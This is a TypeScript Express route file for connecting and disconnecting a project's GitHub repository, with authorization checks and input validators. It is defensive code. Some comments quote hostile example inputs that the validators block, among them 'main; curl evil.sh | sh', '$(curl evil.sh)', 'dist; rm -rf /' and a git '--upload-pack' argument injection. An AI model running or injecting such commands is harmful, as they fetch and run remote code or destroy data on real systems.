/**
 * Connect/disconnect a project's GitHub repo (Phase 3c-1 Task 4):
 * `PUT`/`DELETE /projects/:id/repo`. Both routes MUTATE, so both are gated
 * by `requireProjectManage` (never `requireProjectRead` — see the phase
 * plan's non-negotiable rule 1, which names the exact Phase 3b-2 Critical
 * this guards against: nine mutating routes sat behind a read gate, letting
 * a leaked read-scoped token grant permanent project authority).
 * `requireProjectManage` also gives us, for free: byte-identical 404 for "no
 * such project" vs "exists but unreadable", 401 for an unrecognized bearer,
 * and 403 for a read-scoped PAT or a caller whose instance role does not
 * permit managing projects — none of that is re-implemented here.
 */

import { Router } from "express"
import type { AppDeps } from "../create-app"
import { hasAdminAuthority, requireProjectManage, resolveReadContext } from "../auth/authorize"
import { callerCanSeeInstallation, filterReposForCaller } from "../github/caller-installations"
import { NotFoundError } from "../storage/errors"
import { readIdentityFromConfig } from "../../../src/core/project-identity"
import type { ProjectRepoConfig } from "../storage/types"

const MAX_SHORT_STRING_CHARS = 255
const MAX_COMMAND_CHARS = 2000
const MAX_PATH_CHARS = 1024

function validateInstallationId(v: unknown): string | null {
  if (typeof v !== "number" || !Number.isInteger(v) || v <= 0) {
    return "installationId must be a positive integer"
  }
  return null
}

function validateShortString(v: unknown, field: string): string | null {
  if (typeof v !== "string" || v.trim().length === 0 || v.length > MAX_SHORT_STRING_CHARS) {
    return `${field} must be a non-empty string of at most ${MAX_SHORT_STRING_CHARS} characters`
  }
  return null
}

/**
 * `branch` is destined for a `git clone --branch` / checkout in Phase 3c-2.
 * `validateShortString` alone accepted `main; curl evil.sh | sh` and, worse,
 * `--upload-pack=/tmp/x` — argument injection that turns a clone into
 * arbitrary local execution even with an argv array and no shell. Git's own
 * refname rules already forbid everything excluded here, so the allowlist
 * costs nothing legitimate: no leading `-` (the argument-injection vector),
 * and no `..` (forbidden in refnames anyway).
 */
function validateBranch(v: unknown): string | null {
  const generic = validateShortString(v, "branch")
  if (generic) return generic
  const s = (v as string).trim()
  if (!/^[A-Za-z0-9._\/-]+$/.test(s) || s.startsWith("-") || s.includes("..")) {
    return "branch must be a valid git ref name: letters, digits, '.', '_', '/', '-', not starting with '-' and with no '..'"
  }
  return null
}

function validateCommand(v: unknown, field: string): string | null {
  if (typeof v !== "string" || v.trim().length === 0 || v.length > MAX_COMMAND_CHARS) {
    return `${field} must be a non-empty string of at most ${MAX_COMMAND_CHARS} characters`
  }
  return null
}

/**
 * True iff `v` is safe to later join against a repo checkout root without
 * escaping it. REJECTS rather than sanitizes — see `validateOutputDir`'s
 * doc comment for why silently stripping/normalizing is the wrong move
 * here. Three things disqualify a value:
 *   - empty (or over-long — a bound, not a real limit anyone should hit)
 *   - absolute in ANY form this process might run on: POSIX (`/etc`),
 *     Windows UNC/drive (`\foo`, `C:\foo`), or a literal NUL byte
 *   - any path SEGMENT that is exactly `..` (checked after splitting on
 *     either slash direction, so `foo/../../bar` is caught the same way
 *     `../..` is — string-`includes("..")` alone would also (wrongly)
 *     reject a legitimate directory name like `my..dir`, which splitting
 *     into segments avoids)
 */
function isSafeRepoRelativePath(v: string): boolean {
  if (v.length === 0 || v.length > MAX_PATH_CHARS) return false
  // Charset allowlist FIRST. The traversal rules below are about escaping
  // the checkout root; this is about what 3c-2 may interpolate. `dist; rm
  // -rf /` and `$(curl evil.sh)` both satisfy every traversal rule — no
  // leading slash, no drive letter, no `..` segment — so without this they
  // are accepted and become a shell-injection primitive the moment 3c-2
  // interpolates the value. Closing it at the point of record costs one
  // regex; leaving it open costs an injection audit at every future call
  // site, forever.
  if (!/^[A-Za-z0-9._\/-]+$/.test(v)) return false
  if (v.startsWith("/") || v.startsWith("\\")) return false
  if (/^[A-Za-z]:/.test(v)) return false
  const segments = v.split(/[\\/]+/)
  // A bare `.` (or `./`) resolves to the checkout root itself, which in
  // 3c-2 would serve the ENTIRE repo over HTTP — `.git`, a committed
  // `.env`, everything. Serving the whole repo should be a deliberate act,
  // not the accidental result of an empty-ish default.
  if (segments.every((seg) => seg === "." || seg === "")) return false
  return !segments.some((seg) => seg === "..")
}

/**
 * `outputDir` is stored now but not read until Phase 3c-2, which joins it
 * against the repo's checkout root to locate build output on disk. A
 * traversal accepted HERE becomes an arbitrary-file-read THERE — the exact
 * failure mode named in the phase plan's non-negotiable rule 5. Rejecting
 * outright (not sanitizing) means a malicious value never gets a chance to
 * be silently rewritten into something that still escapes the root in a
 * way that's harder to reason about later.
 */
function validateOutputDir(v: unknown): string | null {
  // Trim BEFORE validating, and store the trimmed value (see the write
  // below). The charset allowlist excludes whitespace, so validating the
  // raw string would reject a user who typed a trailing space in a form —
  // a hostile rejection for a harmless typo. Trimming first also closes
  // the whitespace-only case (`"   "` trims to `""`, which the length
  // check rejects) that previously satisfied every rule.
  if (typeof v !== "string" || !isSafeRepoRelativePath(v.trim())) {
    return "outputDir must be a repo-relative path: no leading '/' or '\\', no drive letter, and no '..' segment"
  }
  return null
}

function validateAutoDeploy(v: unknown): string | null {
  if (typeof v !== "boolean") return "autoDeploy must be a boolean"
  return null
}

export function createProjectRepoRoutes(deps: AppDeps): Router {
  const router = Router()

  router.put("/projects/:id/repo", async (req, res) => {
    // Security gate FIRST, unconditionally — before this route says
    // anything about whether the GitHub App is even configured. A caller
    // who isn't the project's owner/admin must get the exact same 403/404
    // an owner would get on a fully-configured deployment; "not
    // configured" is a deployment-level fact that must never leak to
    // someone who hasn't cleared authorization yet.
    const project = await requireProjectManage(deps, req, res, String(req.params.id), "connect a repository")
    if (!project) return

    // Read into a local before this handler's next `await`. The App client is
    // a mutable field on the runtime now (`github-runtime.ts`) — narrowing on
    // `deps.github.appClient` would not survive the awaits below, and a
    // manifest reload between two reads would hand this handler two different
    // clients mid-request.
    const appClient = deps.github.appClient
    if (!appClient) {
      res.status(400).json({ error: "GitHub App is not configured on this deployment" })
      return
    }

    const body = (req.body ?? {}) as Record<string, unknown>
    const { installationId, owner, name, branch, installCommand, buildCommand, outputDir, autoDeploy } = body

    const validationError =
      validateInstallationId(installationId) ??
      validateShortString(owner, "owner") ??
      validateShortString(name, "name") ??
      validateBranch(branch) ??
      validateCommand(installCommand, "installCommand") ??
      validateCommand(buildCommand, "buildCommand") ??
      validateOutputDir(outputDir) ??
      validateAutoDeploy(autoDeploy)
    if (validationError) {
      res.status(400).json({ error: validationError })
      return
    }

    // Non-negotiable rule 4: `installationId` (and `owner`/`name`) from the
    // client are NOT an authorization boundary just because they
    // type-checked above. Verify server-side, in order:
    //   1. the installation is one THIS CALLER can see — a forged id that
    //      merely LOOKS plausible, and a real installation belonging to
    //      someone else, get the exact same refusal, so the response can't
    //      be used to probe which ids exist;
    //   2. the repo is actually a member of that installation.
    // Only after both succeed do we trust anything about the repo — and
    // even then, `owner`/`name`/`defaultBranch` are taken from GitHub's
    // response, never echoed back from the request body (see the `config`
    // construction below).
    //
    // Step 1 checked the APP's installation list until Phase 3c-1b, which
    // proves only that the App has the installation — never that the caller
    // does. `callerCanSeeInstallation` closes that: the caller's set is
    // captured from `GET /user/installations` at sign-in and stored
    // server-side, and this route reads it rather than trusting the body.
    //
    // The caller is re-resolved here rather than threaded out of
    // `requireProjectManage`: that guard's return type is the project
    // alone, and widening it would touch the member-management routes that
    // share it for no benefit to them. `resolveReadContext` is deterministic
    // for a given request, so a second call cannot disagree with the first —
    // it costs one extra session/token lookup, nothing more.
    const ctx = await resolveReadContext(deps, req)
    if ("error" in ctx) {
      // Unreachable in practice — the guard above already 401s this exact
      // case — but written out rather than asserted, so this never becomes a
      // crash if the guard's bearer handling changes.
      res.status(401).json({ error: ctx.error })
      return
    }
    const githubDeps = { storage: deps.storage, githubApp: appClient }
    // The admin bearer with no session attached has no user, so it has no
    // installation set to filter against. It is allowed through: the admin
    // token is a deployment-level operator credential held by whoever also
    // holds the App private key in the same environment, so gating it here
    // would restrict nothing an operator cannot already do directly. Every
    // OTHER caller — including an admin bearer that DOES carry a session, and
    // an `admin`-ROLE account, both of which have an installation set of
    // their own — is filtered by that set. (`hasAdminAuthority` is exactly
    // `ctx.isAdmin` in this branch, since it is only reached when `ctx.user`
    // is null; it is written this way so a grep for the admin predicate finds
    // every site, and so this stays correct if the branch condition changes.)
    const callerAllowed = ctx.user
      ? await callerCanSeeInstallation(githubDeps, ctx.user, installationId as number)
      : hasAdminAuthority(ctx)
    if (!callerAllowed) {
      res.status(400).json({ error: "Invalid installation" })
      return
    }

    // Step 2 is MEMBERSHIP in the installation's repo list, not a per-repo
    // fetch. `getRepo(owner, name)` (removed in 3c-1b) was not proof of
    // anything: GitHub grants authenticated read of PUBLIC repo metadata
    // regardless of installation, so any public repo on github.com passed
    // it, and an unreachable PRIVATE repo answers 403 rather than 404 —
    // which fell through `getRepo`'s `null`-on-404 contract into a thrown
    // error and a 500, where a clean 400 belongs. Comparison is
    // case-insensitive because GitHub owner/repo names are, and the
    // canonical casing from the list is what gets stored.
    //
    // Step 3 (security audit B4) is the check step 2 was mistaken for: is
    // this repo one THE CALLER can reach? The installation's list is
    // provably caller-independent — `listInstallationRepos` mints an
    // INSTALLATION token — so on an org that installed the App on "All
    // repositories", every signed-in org member passed steps 1 and 2 for
    // every private repo in the org, connected it, and read its source back
    // out of the build log and the published assets. The caller's own repo
    // set is captured at sign-in with the USER's token and intersected here.
    //
    // The refusal stays the SAME 400 as a genuine miss, deliberately: a
    // distinct "exists, but you can't see it" would be an existence oracle
    // for private repo names — the exact leak Phase 3c-1b closed one level up.
    const installationRepos = await appClient.listInstallationRepos(installationId as number)
    // Same admin-bearer carve-out as step 1, for the same reason: a bare
    // admin bearer asserts no identity, so it has no per-user repo set to
    // intersect with, and it is a deployment-level operator credential held
    // by whoever also holds the App private key.
    const repos = ctx.user
      ? await filterReposForCaller(githubDeps, ctx.user, installationId as number, installationRepos)
      : installationRepos
    const wantOwner = (owner as string).trim().toLowerCase()
    const wantName = (name as string).trim().toLowerCase()
    const repo = repos.find(
      (r) => r.owner.toLowerCase() === wantOwner && r.name.toLowerCase() === wantName,
    )
    if (!repo) {
      res.status(400).json({ error: "Repository not found in that installation" })
      return
    }

    // Reconstructed field by field — GitHub's response supplies
    // owner/name/defaultBranch, the validated request body supplies
    // branch/commands/outputDir/autoDeploy. Never a spread of the raw
    // request body (mass-assignment protection, same discipline
    // `tokens-routes.ts`'s `createMachineToken` call and
    // `comments-routes.ts`'s sanitizers use).
    const config: ProjectRepoConfig = {
      installationId: installationId as number,
      owner: repo.owner,
      name: repo.name,
      defaultBranch: repo.defaultBranch,
      branch: (branch as string).trim(),
      installCommand: (installCommand as string).trim(),
      buildCommand: (buildCommand as string).trim(),
      outputDir: (outputDir as string).trim(),
      autoDeploy: autoDeploy as boolean,
    }

    try {
      const updated = await deps.storage.setProjectRepoConfig(project.id, config)

      // C3 -- adopt the identity the repo already carries, at CONNECT time
      // rather than at first build, so the project shows its real name
      // immediately and a collision surfaces before anything is built.
      //
      // Runs strictly AFTER authorization and the installation/repo
      // membership checks above: a file read must never precede the checks
      // that decide whether this caller may know anything about this repo.
      //
      // Every failure degrades to "no identity": a missing config is the
      // common case, a malformed one is the user's own file, and a contents
      // read that throws (network, 5xx, no contents permission) must not fail
      // a connect that has otherwise fully succeeded. `identityConflict` is
      // reported alongside the successful connect rather than as an error --
      // the repo IS legitimately connected; which project id owns it is a
      // separate question only the user can settle.
      let identityConflict: { embeddedId: string; conflictWith: string } | undefined
      let project2 = updated
      try {
        const raw = await appClient.getRepoFile(
          installationId as number,
          repo.owner,
          repo.name,
          ".desde/config.json",
          repo.defaultBranch,
        )
        const identity = raw ? readIdentityFromConfig(JSON.parse(raw)) : null
        if (identity && updated.embeddedId === null) {
          const claimant = await deps.storage.getProjectByEmbeddedId(identity.id)
          if (claimant && claimant.id !== updated.id) {
            identityConflict = { embeddedId: identity.id, conflictWith: claimant.id }
          } else {
            project2 = await deps.storage.setProjectEmbeddedId(updated.id, identity.id)
          }
        }
      } catch {
        // Absent / malformed / unreadable — all "no identity", never fatal.
      }

      res.json(identityConflict ? { ...project2, identityConflict } : project2)
    } catch (error) {
      if (error instanceof NotFoundError) {
        res.status(404).json({ error: error.message })
        return
      }
      throw error
    }
  })

  // Deliberately does NOT gate on `deps.github.appClient` being configured:
  // clearing a repo config is a pure storage operation (no GitHub API call
  // involved), so a project connected while the App WAS configured must
  // still be disconnectable after an operator later removes the App
  // credentials. Gating this on configuration would strand that project's
  // stale config with no way to clear it short of editing the database.
  router.delete("/projects/:id/repo", async (req, res) => {
    const project = await requireProjectManage(deps, req, res, String(req.params.id), "disconnect a repository")
    if (!project) return

    try {
      // `clearProjectRepoConfig` only touches the repo-config row — see its
      // doc comment in storage/types.ts ("Must not touch deployments or
      // `activeDeploymentId`") — so nothing else needs to be done here to
      // uphold that.
      await deps.storage.clearProjectRepoConfig(project.id)
    } catch (error) {
      if (error instanceof NotFoundError) {
        res.status(404).json({ error: error.message })
        return
      }
      throw error
    }
    res.status(204).end()
  })

  return router
}
